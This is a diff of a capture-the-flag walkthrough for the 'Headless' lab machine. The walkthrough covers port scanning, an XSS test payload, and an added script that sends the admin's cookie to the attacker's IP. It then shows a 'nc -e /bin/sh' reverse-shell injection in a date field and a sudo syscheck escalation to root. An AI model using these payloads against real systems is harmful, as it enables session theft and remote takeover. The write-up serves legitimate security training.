@@ -18,21 +18,21 @@ Machine IP: 10.10.11.8
 sudo nmap - sC - sV - oA head_scan 10.10.11.8
 ```
 
-![](/src/assets/images/headless/nmap.png)We have two ports; 22 and 5000. Port 22 is typically not an entry port for RCE. Technically we can enumerate port 22 when we have some credentials. So looking at port 5000
+![](../../assets/images/headless/nmap.png)We have two ports; 22 and 5000. Port 22 is typically not an entry port for RCE. Technically we can enumerate port 22 when we have some credentials. So looking at port 5000
 
 #### Port 5000
 
-![](/src/assets/images/headless/port_5000.png)
+![](../../assets/images/headless/port_5000.png)
 
 If we click on the 'for questions' button, we get the /support directory
 
-![](/src/assets/images/headless/support.png)
+![](../../assets/images/headless/support.png)
 
 Test if special characters (", ', \<, >) are supported then we also test with SQLi and XSS payloads. It works with xss payload: \</scrip\</script>t>\<img src =q onerror=prompt(8)>
 
 Also notice that we get the admin cookie in the cookie header of the response. InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB\_Zfs
 
-![](/src/assets/images/headless/xss.png)
+![](../../assets/images/headless/xss.png)
 
 #### Directory Enumeration
 
@@ -47,31 +47,48 @@ What do we have??
 * dashboard directory we dont have access to
 * Now, Get RCE via XSS using cookie
 
-Using the concept from:
+Using the concept from:[https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e)
 
-Let's capture our request on burpsuite for easy of replay and repeat
+Let's capture our request on burpsuite for easy of replay and repeat. and set up listener (two)
+
+```markdown
+python3 - m http.server 80
+sudo php - S 0.0.0.0: 8000
+```
+
+I tried different payloads, until this worked:
+
+`<script>var i=new Image(); i.src="http://10.10.16.63/?cookie="+btoa(document.cookie);</script>`
+
+Here we have used btoa() method for converting the cookie string into base64 encoded string![](/src/assets/images/headless/burp1.png)![](/src/assets/images/headless/res.png)![](/src/assets/images/headless/res2.png)
+
+Decode cookie:
+
+`echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d`
+
+![](../../assets/images/headless/cookie1.png)
 
 Now that we have our admin cookie, we can insert it into the cookie storage with the browser and now we have access to the /dashboard page
 
-![](/src/assets/images/headless/cookies.png)
+![](../../assets/images/headless/cookies.png)
 
 Pass the request of the /dashboard page to burp
 
-![](/src/assets/images/headless/burp.png)We can insert a payload within the date label to get shell.Using pyaload
+![](../../assets/images/headless/burp.png)We can insert a payload within the date label to get shell.Using pyaload
 
 `nc+-e+/bin/sh+10.10.16.63+1234`
 
-![](/src/assets/images/headless/payload.png)
+![](../../assets/images/headless/payload.png)
 
 We get our low priv shell
 
-![](/src/assets/images/headless/shell.png)
+![](../../assets/images/headless/shell.png)
 
 ### Privilege Escalation
 
 First thing I typically check is sudo -l\`, and we have  a hit this time.
 
-![](/src/assets/images/headless/sduo.png)
+![](../../assets/images/headless/sduo.png)
 
 We can use the syscheck command without having sudo privileges
 
@@ -87,8 +104,8 @@ chmod +x initdb.sh
 
 sudo /usr/bin/syscheck
 
-![](/src/assets/images/headless/run.png)
+![](/../../assets/images/headless/run.png)
 
 And we get our root shell on port 4444
 
-![](/src/assets/images/headless/root.png)
+![](../../assets/images/headless/root.png)
